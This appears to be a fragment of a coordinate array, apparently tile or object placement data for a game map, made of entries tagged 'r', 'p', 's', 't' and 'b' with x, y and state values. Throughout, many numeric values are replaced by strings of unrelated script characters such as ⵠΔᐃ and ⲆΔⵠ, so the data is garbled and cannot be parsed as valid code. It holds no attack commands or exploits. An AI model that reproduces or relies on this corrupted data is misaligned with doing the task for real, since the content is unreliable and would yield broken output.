			[1, "r", 92, 280, ⵠΔΔ],
			[ⵠΔΔ, "r", 91, 280, 1],
			[1, "r", 90, 279, 1],
			[ⵠΔⲆ, "r", 95, 275, ⵠΔᐃ],
			[1, "r", 95, 274, ᐃᐃⵠ],
			[1, "r", 95, 273, ⵠΔΔ],
			[ⵠΔΔ, "r", 95, 272, ⵠΔΔ],
			[ΔΔΔ, "r", 94, 274, ΔⲆⵠ],
			[1, "r", 94, 273, 1],
			[1, "r", 94, 272, ΔΔΔ],
			[1, "r", 93, 272, ⵠΔᐃ],
			[ⵠⲆΔ, "r", 93, 273, ⵠΔᐃ],
			[1, "r", 93, 274, 1],
			[1, "r", 92, 273, 1],
			[ᐃᐃⵠ, "r", 92, 272, 1],
			[ΔΔΔ, "r", 92, 270, 1],
			[1, "r", 92, 271, 1],
			[ᐃⲆᐃ, "r", 92, 269, 1],
			[1, "r", 90, 269, 1],
			[1, "r", 91, 269, 1],
			[ⵠΔⲆ, "r", 91, 271, ΔΔΔ],
			[ⵠΔᐃ, "r", 91, 270, 1],
			[ⵠΔΔ, "r", 95, 278, 1],
			[1, "r", 95, 277, ⵠΔΔ],
			[ΔⲆⵠ, "r", 95, 276, ᐃⲆᐃ],
			[ΔΔΔ, "r", 94, 276, 1],
			[1, "r", 94, 275, 1],
			[ᐃⲆᐃ, "r", 93, 275, Ⲇᐃⵠ],
			[1, "r", 92, 274, Ⲇᐃⵠ],
			[Ⲇᐃⵠ, "r", 92, 275, ΔⲆⵠ],
			[ⵠΔᐃ, "r", 91, 275, 1],
			[1, "r", 90, 275, ⵠⲆΔ],
			[1, "r", 89, 274, ⵠΔⲆ],
			[1, "r", 90, 274, 1],
			[1, "r", 89, 275, ᐃᐃⵠ],
			[ᐃᐃⵠ, "r", 88, 274, ⵠΔᐃ],
			[ⵠΔⲆ, "r", 88, 273, Ⲇᐃⵠ],
			[ᐃᐃⵠ, "r", 86, 272, Ⲇᐃⵠ],
			[ᐃⲆᐃ, "r", 85, 271, ᐃⲆᐃ],
			[1, "r", 86, 271, 1],
			[1, "r", 87, 272, 1],
			[ᐃⲆᐃ, "r", 55, 248, ⵠΔⲆ],
			[1, "r", 54, 248, 1],
			[ΔⲆⵠ, "r", 56, 249, 1],
			[1, "r", 55, 249, ⵠΔⲆ],
			[ᐃⲆᐃ, "r", 55, 250, Ⲇᐃⵠ],
			[ⵠΔᐃ, "r", 56, 250, 1],
			[ⵠΔᐃ, "r", 57, 250, ⵠΔᐃ],
			[ΔⲆⵠ, "r", 57, 249, 1],
			[1, "r", 59, 250, 1],
			[ⵠⲆΔ, "r", 58, 250, 1],
			[ⵠΔᐃ, "r", 60, 250, 1],
			[ΔΔΔ, "r", 61, 251, ⵠΔΔ],
			[1, "r", 60, 251, 1],
			[ΔⲆⵠ, "r", 62, 251, ⵠⲆΔ],
			[ⵠΔᐃ, "r", 62, 252, 1],
			[1, "r", 63, 252, ᐃᐃⵠ],
			[Ⲇᐃⵠ, "r", 58, 251, ΔⲆⵠ],
			[ⵠΔᐃ, "r", 57, 251, 1],
			[Ⲇᐃⵠ, "r", 56, 251, 1],
			[1, "r", 58, 252, ⵠΔᐃ],
			[ⵠΔⲆ, "r", 57, 252, 1],
			[ᐃⲆᐃ, "r", 57, 253, 1],
			[ⵠΔΔ, "r", 58, 253, 1],
			[ⵠΔᐃ, "r", 58, 254, 1],
			[1, "r", 59, 255, ᐃⲆᐃ],
			[ΔΔΔ, "r", 58, ⵠᐃΔᐃᐃᐃᐃ, 1],
			[Ⲇᐃⵠ, "r", 57, 254, ΔⲆⵠ],
			[ⵠΔΔ, "r", 56, 252, 1],
			[1, "r", 55, 251, 1],
			[1, "r", 60, 255, ⵠΔⲆ],
			[ⵠΔᐃ, "r", 61, ΔⵠᐃⵠΔ, ⵠⲆΔ],
			[ΔⲆⵠ, "r", 61, ᐃⲆᐃᐃⵠⵠⲆ, ᐃⲆᐃ],
			[ᐃᐃⵠ, "r", 60, 256, 1],
			[ᐃᐃⵠ, "r", 62, ⲆᐃΔᐃⵠⵠⵠ, 1],
			[1, "r", 62, 257, ΔΔΔ],
			[ᐃⲆᐃ, "r", 61, 257, Ⲇᐃⵠ],
			[1, "r", 64, 253, ⵠΔᐃ],
			[1, "r", 64, 254, 1],
			[ᐃᐃⵠ, "r", 65, 254, ᐃⲆᐃ],
			[ΔⲆⵠ, "r", 61, 250, 1],
			[1, "r", 64, 252, 1],
			[ΔΔΔ, "r", 65, 253, ΔⲆⵠ],
			[ⵠΔΔ, "r", 66, 254, ᐃᐃⵠ],
			[1, "r", 65, ⵠᐃᐃⵠⲆⵠⲆ, ⵠΔⲆ],
			[1, "r", 64, ΔΔᐃΔⲆ, 1],
			[ⵠΔⲆ, "r", 64, 256, 1],
			[ⵠΔΔ, "r", 65, ΔΔᐃⲆⲆⵠⵠ, ᐃᐃⵠ],
			[1, "r", 65, 257, 1],
			[1, "r", 64, 257, Ⲇᐃⵠ],
			[1, "r", 63, 257, 1],
			[ⵠΔΔ, "r", 62, 258, ΔΔΔ],
			[1, "r", 63, 258, 1],
			[1, "r", 64, 258, Ⲇᐃⵠ],
			[1, "r", 66, 255, 1],
			[1, "r", 66, 256, 1],
			[1, "r", 66, 257, ΔΔΔ],
			[ⵠΔⲆ, "r", 66, 258, ⵠⲆΔ],
			[ᐃⲆᐃ, "r", 65, 258, Ⲇᐃⵠ],
			[1, "r", 67, 258, 1],
			[1, "r", 67, 257, 1],
			[ⵠΔΔ, "r", 67, 259, 1],
			[1, "r", 66, 259, 1],
			[ⵠΔⲆ, "r", 65, 259, ᐃⲆᐃ],
			[ⵠΔᐃ, "r", 56, 246, 1],
			[Ⲇᐃⵠ, "r", 56, 245, ⵠΔᐃ],
			[1, "r", 68, 258, ⵠΔΔ],
			[ΔⲆⵠ, "r", 68, 259, 1],
			[ᐃᐃⵠ, "r", 68, 260, 1],
			[ⵠΔᐃ, "r", 69, 260, 1],
			[1, "r", 69, 261, ΔΔΔ],
			[ⵠΔⲆ, "r", 70, 261, 1],
			[1, "r", 71, 261, ᐃᐃⵠ],
			[1, "r", 67, 260, 1],
			[1, "r", 89, 269, ⵠΔΔ],
			[Ⲇᐃⵠ, "r", 89, 268, ΔΔΔ],
			[ⵠΔᐃ, "r", 90, 268, ΔΔΔ],
			[ⵠΔΔ, "r", 82, 267, ᐃⲆᐃ],
			[1, "r", 83, 267, 1],
			[1, "r", 80, 266, ⵠΔΔ],
			[1, "r", 81, 266, 1],
			[1, "r", 81, 267, ⵠⲆΔ],
			[1, "r", 79, 266, ᐃᐃⵠ],
			[1, "r", 78, 265, 1],
			[1, "r", 77, 265, 1],
			[1, "r", 76, 264, 1],
			[1, "r", 75, 264, 1],
			[ΔΔΔ, "r", 75, 263, 1],
			[ΔⲆⵠ, "r", 74, 263, 1],
			[Ⲇᐃⵠ, "r", 74, 262, ⵠΔΔ],
			[1, "r", 72, 262, 1],
			[1, "r", 73, 262, 1],
			[1, "r", 71, 262, 1],
			[Ⲇᐃⵠ, "r", 85, 270, ΔΔΔ],
			[ΔΔΔ, "r", 84, 270, 1],
			[1, "r", 84, 269, 1],
			[Ⲇᐃⵠ, "r", 83, 269, ΔⲆⵠ],
			[ⵠⲆΔ, "r", 82, 269, 1],
			[ᐃⲆᐃ, "r", 81, 269, 1],
			[1, "r", 81, 268, 1],
			[Ⲇᐃⵠ, "r", 82, 268, ⵠΔⲆ],
			[1, "r", 83, 268, ΔΔΔ],
			[ᐃᐃⵠ, "r", 80, 268, ⵠⲆΔ],
			[1, "r", 80, 267, 1],
			[1, "r", 79, 267, ⵠΔΔ],
			[1, "r", 78, 266, ⵠΔⲆ],
			[ⵠⲆΔ, "r", 76, 265, 1],
			[1, "r", 75, 262, ᐃⲆᐃ],
			[ⵠΔᐃ, "r", 90, 280, 1],
			[1, "r", 89, 280, 1],
			[1, "r", 89, 279, 1],
			[ΔⲆⵠ, "r", 88, 279, 1],
			[1, "r", 88, 278, ⵠΔⲆ],
			[ⵠⲆΔ, "r", 87, 277, ⵠΔⲆ],
			[ᐃⲆᐃ, "r", 86, 276, ⵠΔⲆ],
			[1, "r", 86, 275, 1],
			[1, "r", 86, 274, 1],
			[1, "r", 86, 273, 1],
			[ᐃᐃⵠ, "r", 85, 273, ⵠΔᐃ],
			[1, "r", 85, 272, ᐃᐃⵠ],
			[1, "r", 85, 274, ΔⲆⵠ],
			[1, "r", 86, 277, 1],
			[ⵠΔᐃ, "r", 87, 278, 1],
			[1, "r", 84, 271, ΔⲆⵠ],
			[1, "r", 83, 270, 1],
			[ΔΔΔ, "r", 87, 273, Ⲇᐃⵠ],
			[ⵠⲆΔ, "r", 91, 274, ⵠⲆΔ],
			[1, "r", 89, 273, ΔⲆⵠ],
			[1, "r", 88, 272, 1],
			[1, "r", 91, 281, 1],
			[Ⲇᐃⵠ, "r", 92, 282, 1],
			[1, "r", 88, 280, ᐃⲆᐃ],
			[1, "r", 87, 279, ⵠⲆΔ],
			[1, "r", 85, 275, ᐃᐃⵠ],
			[ⵠΔᐃ, "r", 84, 273, 1],
			[1, "r", 84, 272, 1],
			[1, "r", 83, 271, ⵠΔΔ],
			[ΔⲆⵠ, "r", 82, 270, ΔΔΔ],
			[ⵠΔᐃ, "r", 84, 267, Δⵠᐃ],
			[ΔΔΔ, "r", 85, 267, 0],
			[1, "r", 76, 262, 0],
			[Ⲇᐃⵠ, "r", 77, 262, 0],
			[ᐃᐃⵠ, "r", 88, 268, 0],
			[1, "r", 78, 262, ᐃⵠⲆ],
			[ΔⲆⵠ, "r", 79, 262, 0],
			[Ⲇᐃⵠ, "r", 80, 262, ᐃΔΔ],
			[ΔΔΔ, "r", 80, 263, Δⵠᐃ],
			[1, "r", 81, 263, ⲆΔⵠ],
			[ᐃⲆᐃ, "r", 82, 263, 0],
			[1, "r", 83, 263, ΔΔⵠ],
			[ⵠΔᐃ, "r", 84, 263, ᐃΔΔ],
			[Ⲇᐃⵠ, "r", 85, 263, 0],
			[1, "r", 88, 262, ⲆΔⵠ],
			[Ⲇᐃⵠ, "r", 89, 262, ᐃⵠΔ],
			[Ⲇᐃⵠ, "r", 90, 262, ᐃΔΔ],
			[ΔΔΔ, "r", 87, 262, ⵠⲆⲆ],
			[1, "r", 86, 262, ⲆΔⵠ],
			[ᐃⲆᐃ, "r", 86, 263, ⲆΔⵠ],
			[ΔⲆⵠ, "r", 87, 263, 0],
			[ΔⲆⵠ, "r", 91, 262, ᐃΔΔ],
			[1, "r", 95, 262, Δⵠᐃ],
			[ⵠΔⲆ, "r", 94, 262, ᐃⵠⲆ],
			[1, "r", 86, 267, ΔΔⵠ],
			[ⵠΔⲆ, "r", 87, 267, 0],
			[1, "r", 87, 268, 0],
			[1, "r", 86, 268, ᐃⵠΔ],
			[ΔⲆⵠ, "r", 74, 189, ⵠⲆⲆ],
			[1, "r", 75, 189, 0],
			[ⵠⲆΔ, "r", 76, 189, ΔΔⵠ],
			[1, "r", 77, 189, 0],
			[ΔΔΔ, "r", 78, 190, ᐃⵠⲆ],
			[ⵠΔᐃ, "r", 77, 190, ⲆΔⵠ],
			[1, "r", 75, 190, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "r", 76, 190, ΔΔⵠ],
			[1, "r", 74, 190, 0],
			[1, "r", 73, 190, 0],
			[1, "r", 78, 191, ⵠⲆⲆ],
			[ΔⲆⵠ, "r", 76, 191, ΔⲆⲆ],
			[ΔⲆⵠ, "r", 77, 191, 0],
			[1, "r", 75, 191, 0],
			[1, "r", 74, 191, ᐃⵠⲆ],
			[1, "r", 78, 192, 0],
			[1, "r", 77, 192, ⵠⲆⲆ],
			[ΔⲆⵠ, "r", 76, 192, ΔⲆⲆ],
			[1, "r", 75, 192, 0],
			[1, "r", 74, 192, 0],
			[ⵠΔⲆ, "r", 73, 191, ᐃΔΔ],
			[ⵠΔⲆ, "f", ⵠΔᐃ, 96, 22, 1],
			[1, "s", Ⲇᐃⵠ, 97, 22, ⵠΔⲆ],
			[1, "f", 1, 98, 22, ⵠΔⲆ],
			[1, "s", 0, 99, 22, 1],
			[ᐃᐃⵠ, "s", ᐃⲆᐃ, ΔᐃΔᐃΔ, 21, 1],
			[1, "s", ⵠⲆΔ, 96, 49, ᐃᐃⵠ],
			[1, "s", 1, ΔᐃΔᐃΔ, 50, 1],
			[ⵠΔᐃ, "s", ⵠⲆⲆ, 99, 49, 1],
			[ΔΔΔ, "s", ΔⲆⲆ, 97, 49, ⵠΔⲆ],
			[1, "f", ᐃᐃⵠ, 98, 49, 1],
			[1, "r", 70, 218, 0],
			[1, "r", 71, 218, ΔⲆⲆ],
			[1, "r", 72, 218, 0],
			[ⵠΔᐃ, "r", 73, 218, ΔΔⵠ],
			[ⵠⲆΔ, "r", 74, 219, 0],
			[1, "r", 73, 219, 0],
			[ᐃᐃⵠ, "r", 72, 219, 0],
			[1, "r", 71, 219, 0],
			[ΔΔΔ, "r", 70, 219, ᐃⵠΔ],
			[1, "r", 73, 220, ΔΔⵠ],
			[ⵠΔΔ, "r", 72, 220, 0],
			[ⵠΔΔ, "r", 71, 220, 0],
			[ᐃⲆᐃ, "r", 72, 221, 0],
			[1, "r", 71, 221, 0],
			[Ⲇᐃⵠ, "r", 70, 221, ᐃΔΔ],
			[1, "r", 69, 221, 0],
			[1, "r", 68, 221, 0],
			[1, "r", 70, 220, 0],
			[ⵠΔᐃ, "r", 69, 220, 0],
			[ⵠΔⲆ, "r", 69, 219, 0],
			[1, "r", 68, 220, ᐃⵠΔ],
			[ᐃⲆᐃ, "r", 73, 221, 0],
			[ᐃⲆᐃ, "r", 73, 222, ᐃΔΔ],
			[1, "r", 71, 222, 0],
			[ΔΔΔ, "r", 72, 222, 0],
			[ⵠΔΔ, "r", 74, 221, ᐃⵠΔ],
			[ΔⲆⵠ, "r", 74, 220, ΔΔⵠ],
			[ᐃⲆᐃ, "r", 75, 220, 0],
			[ᐃᐃⵠ, "r", 75, 221, 0],
			[1, "r", 70, 222, 0],
			[1, "r", 69, 222, Δⵠᐃ],
			[1, "r", 29, 217, 0],
			[ⵠⲆΔ, "r", 30, 217, 0],
			[1, "r", 31, 217, 0],
			[1, "r", 32, 217, ⲆΔⵠ],
			[ΔⲆⵠ, "r", 31, 219, ᐃⵠΔ],
			[1, "r", 30, 219, ⵠⲆⲆ],
			[1, "r", 29, 219, 0],
			[1, "r", 27, 219, 0],
			[Ⲇᐃⵠ, "r", 25, 219, 0],
			[ⵠΔᐃ, "r", 26, 219, ᐃⵠΔ],
			[ⵠΔΔ, "r", 28, 219, 0],
			[ΔⲆⵠ, "r", 26, 218, Δⵠᐃ],
			[1, "r", 27, 218, 0],
			[ⵠΔΔ, "r", 28, 218, ᐃΔΔ],
			[1, "r", 29, 218, 0],
			[1, "r", 30, 218, 0],
			[1, "r", 28, 217, ⲆΔⵠ],
			[1, "r", 26, 217, 0],
			[1, "r", 27, 217, 0],
			[ⵠⲆΔ, "r", 28, 216, 0],
			[ⵠⲆΔ, "r", 29, 216, 0],
			[ⵠΔᐃ, "r", 30, 216, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "r", 31, 218, 0],
			[1, "r", 32, 218, 0],
			[ⵠΔΔ, "r", 31, 216, 0],
			[1, "r", 31, 221, 0],
			[Ⲇᐃⵠ, "r", 31, 220, 0],
			[ⵠΔᐃ, "r", 30, 220, 0],
			[1, "r", 29, 220, ΔΔⵠ],
			[1, "r", 28, 220, 0],
			[ⵠΔⲆ, "r", 27, 220, ΔⲆⲆ],
			[1, "r", 26, 220, 0],
			[1, "r", 25, 218, 0],
			[ΔⲆⵠ, "r", 27, 221, ᐃΔΔ],
			[ΔⲆⵠ, "r", 28, 221, 0],
			[1, "r", 29, 221, 0],
			[1, "r", 30, 221, 0],
			[1, "r", 32, 220, 0],
			[1, "r", 32, 219, ⵠⲆⲆ],
			[1, "r", 33, 218, ΔⲆⲆ],
			[1, "r", 33, 219, Δⵠᐃ],
			[ⵠΔΔ, "r", 75, 238, ᐃⵠⲆ],
			[1, "r", 76, 238, 0],
			[Ⲇᐃⵠ, "r", 77, 239, ⵠⲆⲆ],
			[1, "r", 76, 239, ΔⲆⲆ],
			[1, "r", 75, 239, 0],
			[1, "r", 74, 239, 0],
			[1, "r", 76, 240, 0],
			[ΔΔΔ, "r", 77, 240, 0],
			[ⵠΔⲆ, "r", 78, 240, ΔⲆⲆ],
			[ΔⲆⵠ, "r", 77, 241, 0],
			[ⵠΔᐃ, "r", 76, 241, 0],
			[1, "r", 75, 241, 0],
			[1, "r", 75, 240, ΔⲆⲆ],
			[1, "r", 74, 240, 0],
			[1, "r", 78, 239, 0],
			[ⵠΔⲆ, "r", 77, 238, 0],
			[Ⲇᐃⵠ, "r", ⲆⵠⵠⲆⲆ, 253, ᐃΔΔ],
			[1, "r", 19, 252, 0],
			[ΔⲆⵠ, "r", ⵠᐃΔᐃᐃ, 252, 0],
			[ⵠΔⲆ, "r", 21, 253, ⵠⲆⲆ],
			[1, "r", 23, 254, 0],
			[1, "r", ⲆⵠᐃᐃⲆ, 254, ᐃⵠΔ],
			[Ⲇᐃⵠ, "r", ᐃΔΔⲆΔ, 254, 0],
			[1, "r", 22, 254, 0],
			[1, "r", ⲆᐃΔⵠΔ, 254, 0],
			[ᐃᐃⵠ, "r", ᐃΔⲆΔⵠ, 253, 0],
			[1, "r", 20, 253, 0],
			[ΔΔΔ, "r", 21, 254, 0],
			[1, "r", 22, 253, ΔⲆⲆ],
			[ⵠΔⲆ, "r", 21, ᐃⵠᐃᐃᐃⲆΔ, 0],
			[1, "r", ᐃΔⲆⵠᐃ, 255, ΔΔⵠ],
			[1, "r", ⲆⲆⵠΔⵠ, 255, 0],
			[ΔⲆⵠ, "r", 18, 255, 0],
			[1, "r", 17, ΔΔᐃΔⲆ, 0],
			[ΔⲆⵠ, "r", 17, 254, 0],
			[1, "r", 22, ΔΔᐃΔⲆ, Δⵠᐃ],
			[ⵠⲆΔ, "r", 19, 256, ΔΔⵠ],
			[1, "r", ⵠΔΔⲆⲆ, 256, ⲆΔⵠ],
			[1, "r", 21, ᐃⲆᐃᐃⵠⵠⲆ, ⲆΔⵠ],
			[1, "r", 39, 270, ᐃⵠΔ],
			[ΔⲆⵠ, "r", 40, 270, ᐃⵠⲆ],
			[1, "r", 41, 270, Δⵠᐃ],
			[ⵠΔΔ, "r", 43, 270, ᐃΔΔ],
			[1, "r", 44, 270, ΔⲆⲆ],
			[1, "r", 46, 270, ᐃΔΔ],
			[ᐃᐃⵠ, "r", 42, 270, ⵠⲆⲆ],
			[ΔⲆⵠ, "r", 45, 270, ᐃΔΔ],
			[1, "r", 44, 269, Δⵠᐃ],
			[ⵠΔᐃ, "r", 43, 269, 0],
			[ⵠΔᐃ, "r", 42, 269, ᐃⵠΔ],
			[ΔⲆⵠ, "r", 40, 269, ⵠⲆⲆ],
			[ⵠⲆΔ, "r", 41, 269, ᐃⵠΔ],
			[ⵠⲆΔ, "r", 45, 271, ⵠⲆⲆ],
			[1, "r", 44, 271, 0],
			[ΔⲆⵠ, "r", 43, 271, 0],
			[ᐃⲆᐃ, "r", 42, 271, ᐃⵠⲆ],
			[ᐃⲆᐃ, "r", 41, 271, Δⵠᐃ],
			[1, "r", 40, 271, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "r", 39, 271, ΔΔⵠ],
			[Ⲇᐃⵠ, "r", 46, 271, 0],
			[ⵠⲆΔ, "r", 45, 272, 0],
			[Ⲇᐃⵠ, "r", 44, 272, 0],
			[1, "r", 43, 272, 0],
			[ᐃᐃⵠ, "r", 42, 272, 0],
			[1, "r", ΔΔⲆᐃⵠ, 284, 0],
			[1, "r", 20, 284, ᐃⵠΔ],
			[ᐃᐃⵠ, "r", 21, 285, 0],
			[ᐃⲆᐃ, "r", 22, 285, ⲆΔⵠ],
			[ΔΔΔ, "r", 23, 286, ᐃⵠⲆ],
			[ⵠΔΔ, "r", 22, 288, 0],
			[1, "r", 20, 288, ⵠⲆⲆ],
			[Ⲇᐃⵠ, "r", 18, 288, 0],
			[ᐃᐃⵠ, "r", 17, 287, 0],
			[1, "r", 16, 287, 0],
			[1, "r", ΔᐃᐃΔⵠ, 286, 0],
			[ⵠΔⲆ, "r", 17, 286, 0],
			[ΔΔΔ, "r", ᐃΔᐃΔᐃ, 286, 0],
			[ΔⲆⵠ, "r", 19, 286, 0],
			[1, "r", 20, 286, 0],
			[ⵠΔΔ, "r", 21, 286, Δⵠᐃ],
			[1, "r", 22, 286, 0],
			[ΔⲆⵠ, "r", 20, 285, 0],
			[ⵠΔⲆ, "r", ΔΔⵠΔⲆ, 285, ⲆΔⵠ],
			[ᐃᐃⵠ, "r", ⲆⵠΔⵠⵠ, 285, 0],
			[ⵠΔΔ, "r", ΔⵠⲆᐃⵠⲆᐃ, 285, ᐃⵠΔ],
			[1, "r", ᐃΔΔⲆΔ, 287, ΔⲆⲆ],
			[1, "r", 18, 287, 0],
			[ᐃᐃⵠ, "r", ⲆⵠᐃᐃⲆ, 287, 0],
			[ΔⲆⵠ, "r", 21, 287, ᐃⵠⲆ],
			[1, "r", 22, 287, 0],
			[1, "r", 23, 287, 0],
			[1, "r", 21, 288, 0],
			[1, "r", ⵠⲆᐃΔᐃ, 288, 0],
			[Ⲇᐃⵠ, "r", ΔⲆⲆΔΔ, 288, ΔⲆⲆ],
			[ⵠΔᐃ, "r", ⲆⲆⲆⵠᐃ, 289, 0],
			[Ⲇᐃⵠ, "r", 21, 289, 0],
			[Ⲇᐃⵠ, "r", 22, 289, 0],
			[ⵠΔΔ, "r", ΔΔⲆⵠᐃ, 289, 0],
			[ⵠΔΔ, "r", 23, 288, 0],
			[1, "r", 24, 287, 0],
			[1, "r", 24, 286, 0],
			[ⵠⲆΔ, "r", 23, 285, ᐃΔΔ],
			[1, "r", 66, 286, ᐃⵠΔ],
			[1, "r", 64, 287, 0],
			[1, "r", 63, 287, 0],
			[ⵠΔⲆ, "r", 60, 287, ᐃⵠⲆ],
			[Ⲇᐃⵠ, "r", 59, 285, ΔΔⵠ],
			[ⵠⲆΔ, "r", 58, 284, 0],
			[1, "r", 59, 283, ᐃΔΔ],
			[1, "r", 65, 283, 0],
			[ᐃⲆᐃ, "r", 64, 283, ⲆΔⵠ],
			[ᐃᐃⵠ, "r", 63, 283, ⲆΔⵠ],
			[1, "r", 62, 283, 0],
			[1, "r", 61, 283, 0],
			[ⵠⲆΔ, "r", 60, 283, 0],
			[1, "r", 59, 284, 0],
			[1, "r", 58, 285, ΔΔⵠ],
			[1, "r", 60, 286, 0],
			[ᐃⲆᐃ, "r", 59, 286, ᐃⵠⲆ],
			[1, "r", 61, 287, 0],
			[ⵠΔᐃ, "r", 62, 287, 0],
			[1, "r", 61, 286, 0],
			[ⵠⲆΔ, "r", 62, 286, 0],
			[ΔⲆⵠ, "r", 63, 286, 0],
			[1, "r", 64, 286, 0],
			[ᐃⲆᐃ, "r", 65, 286, 0],
			[1, "r", 67, 285, ᐃⵠⲆ],
			[1, "r", 66, 285, 0],
			[Ⲇᐃⵠ, "r", 65, 285, ᐃⵠΔ],
			[1, "r", 64, 285, 0],
			[ⵠΔᐃ, "r", 63, 285, 0],
			[ᐃⲆᐃ, "r", 62, 285, 0],
			[1, "r", 61, 285, ΔⲆⲆ],
			[ⵠΔΔ, "r", 60, 285, 0],
			[1, "r", 60, 284, 0],
			[ᐃᐃⵠ, "r", 61, 284, 0],
			[1, "r", 62, 284, ⲆΔⵠ],
			[ⵠΔΔ, "r", 63, 284, ᐃⵠΔ],
			[Ⲇᐃⵠ, "r", 64, 284, 0],
			[ΔⲆⵠ, "r", 65, 284, 0],
			[1, "r", 66, 284, ⲆΔⵠ],
			[1, "r", 65, 287, ᐃⵠΔ],
			[ΔⲆⵠ, "r", 67, 286, 0],
			[Ⲇᐃⵠ, "p", 0, ⲆᐃᐃΔΔⵠⲆ, 189, 1],
			[1, "p", 0, 32, 184, 1],
			[ⵠΔᐃ, "p", ΔΔⵠ, 47, 191, 1],
			[ᐃᐃⵠ, "p", ᐃΔΔ, 64, 184, ⵠΔⲆ],
			[1, "p", ΔⲆⲆ, 84, 192, 1],
			[1, "p", ΔⲆⲆ, 78, 207, 1],
			[ⵠⲆΔ, "p", Δⵠᐃ, 58, 216, 1],
			[ⵠΔⲆ, "p", ⵠⲆⲆ, 41, 211, ⵠⲆΔ],
			[1, "p", 0, ᐃΔᐃΔᐃ, 211, ᐃⲆᐃ],
			[ⵠΔⲆ, "p", ΔΔⵠ, 14, 230, 1],
			[ᐃᐃⵠ, "p", 0, 29, 237, ⵠΔΔ],
			[1, "p", 0, 50, 230, ᐃᐃⵠ],
			[ⵠΔᐃ, "p", 0, 78, 241, ᐃᐃⵠ],
			[1, "p", ᐃⵠΔ, 74, ᐃⲆᐃⲆᐃⵠⲆ, 1],
			[1, "p", ᐃⵠΔ, 68, 266, 1],
			[ΔⲆⵠ, "p", 0, 48, 259, 1],
			[ᐃⲆᐃ, "p", ᐃⵠⲆ, 31, 263, 1],
			[1, "p", ᐃⵠⲆ, ᐃΔᐃΔᐃ, 274, 1],
			[1, "p", 0, 33, 283, 1],
			[1, "p", ⵠⲆⲆ, 66, 287, ⵠΔΔ],
			[ΔΔΔ, "p", ⲆΔⵠ, 82, 291, 1],
			[1, "p", 0, ΔᐃᐃΔⵠ, 295, 1],
			[ⵠΔⲆ, "p", 0, 45, 294, 1],
			[ⵠΔΔ, "p", ΔⲆⲆ, 18, 252, 1],
			[ᐃⲆᐃ, "p", 0, 79, 227, 1],
			[1, "p", ᐃⵠΔ, 32, 200, 1],
			[ⵠΔᐃ, "p", Δⵠᐃ, 64, 200, 1],
			[ΔⲆⵠ, "s", ΔⲆⲆ, 21, 193, 1],
			[1, "s", ᐃⲆᐃ, 18, 189, ⵠΔΔ],
			[1, "s", ᐃⲆΔⲆ, 26, 189, 1],
			[ⵠΔΔ, "b", 1, ⲆΔΔⵠⲆ, 181, 0],
			[1, "b", 2, ⲆⵠⲆᐃΔ, 190, ΔⲆⲆ],
			[1, "b", 2, 29, 193, 0],
			[1, "t", 3, 16, 182, ΔⲆⲆ],
			[1, "t", ⲆᐃΔᐃ, 13, 195, ⵠⲆⲆ],
			[1, "t", 4, 16, 183, ⵠⲆⲆ],
			[1, "t", 5, 10, 184, ᐃⵠΔ],
			[1, "t", ᐃΔΔΔ, 23, 182, 0],
			[1, "t", 4, 30, 187, 0],
			[ⵠΔⲆ, "t", 1, 26, 192, 0],
			[1, "b", 1, 25, 188, Δⵠᐃ],
			[ⵠΔⲆ, "s", ᐃⲆᐃ, 24, 181, 1],
			[ᐃⲆᐃ, "t", ᐃᐃⲆⲆ, 33, 183, 0],
			[Ⲇᐃⵠ, "b", ⵠΔΔ, 36, 189, 0],
			[ΔⲆⵠ, "t", 2, 35, 190, Δⵠᐃ],
			[1, "b", ⲆᐃΔᐃ, ᐃΔⲆΔⵠ, 200, 0],
			[ⵠΔⲆ, "s", 0, 28, 194, 1],
			[ᐃⲆᐃ, "s", ⵠΔΔ, 32, 196, Ⲇᐃⵠ],
			[1, "s", ΔΔΔ, 36, 183, 1],
			[1, "s", ᐃⲆⵠᐃ, 38, 184, ᐃᐃⵠ],
			[Ⲇᐃⵠ, "s", 2, ⵠⲆⲆᐃⵠ, 192, ΔΔΔ],
			[ΔⲆⵠ, "s", 2, ΔᐃⵠⲆⵠ, 183, ΔⲆⵠ],
			[ⵠⲆΔ, "s", 1, ΔⲆᐃᐃⲆ, 199, 1],
			[ᐃᐃⵠ, "b", 0, 12, 202, ΔΔⵠ],
			[1, "t", 2, 13, 203, 0],
			[1, "t", ᐃⵠⵠΔ, ⵠΔΔⲆⲆ, 200, ΔⲆⲆ],
			[ⵠⲆΔ, "t", ⲆᐃᐃΔ, 12, 194, 0],
			[1, "t", 5, ⵠⵠΔⵠᐃ, 205, ΔⲆⲆ],
			[1, "t", ᐃΔΔⲆ, 29, 200, 0],
			[1, "t", ᐃᐃⲆⲆ, 28, 201, ΔⲆⲆ],
			[ᐃⲆᐃ, "s", ⵠⵠΔⲆ, 25, 199, ⵠΔΔ],
			[ⵠⲆΔ, "s", Ⲇᐃⵠ, 22, 204, 1],
			[ⵠΔΔ, "g", ᐃⲆⵠᐃ, 25, 205, 1],
			[ⵠΔᐃ, "b", ᐃᐃⵠ, 27, 216, ΔΔⵠ],
			[ᐃⲆᐃ, "s", 1, 25, 217, 1],
			[1, "s", 1, 33, 217, 1],
			[ΔⲆⵠ, "s", ⵠⵠΔⲆ, 35, 215, 1],
			[ⵠⲆΔ, "s", 0, 32, 221, 1],
			[1, "t", 2, 31, 222, 0],
			[1, "t", 4, 26, 221, 0],
			[1, "b", ΔⲆᐃⲆ, 27, 222, ΔⲆⲆ],
			[Ⲇᐃⵠ, "b", ΔΔⵠ, 17, 217, ᐃⵠΔ],
			[Ⲇᐃⵠ, "t", ᐃⲆΔⵠ, ⲆⵠⲆᐃΔ, 216, ⲆΔⵠ],
			[1, "t", 4, 13, 215, 0],
			[1, "t", 5, 30, 213, ᐃⵠⲆ],
			[1, "t", 5, 24, 208, ᐃΔΔ],
			[ᐃⲆᐃ, "s", 1, ⵠⲆᐃᐃⲆ, 216, ⵠΔᐃ],
			[ⵠΔΔ, "s", 2, 11, 210, 1],
			[ᐃⲆᐃ, "s", ⲆⲆΔᐃ, 34, 223, 1],
			[Ⲇᐃⵠ, "b", 2, 36, 218, 0],
			[ΔⲆⵠ, "t", ⵠΔᐃΔ, 40, 206, 0],
			[ᐃᐃⵠ, "t", 5, 35, 203, 0],
			[1, "t", ⲆᐃΔᐃ, 39, 206, ⲆΔⵠ],
			[1, "b", ⵠΔᐃ, 34, 204, 0],
			[ΔⲆⵠ, "s", 1, 33, 206, 1],
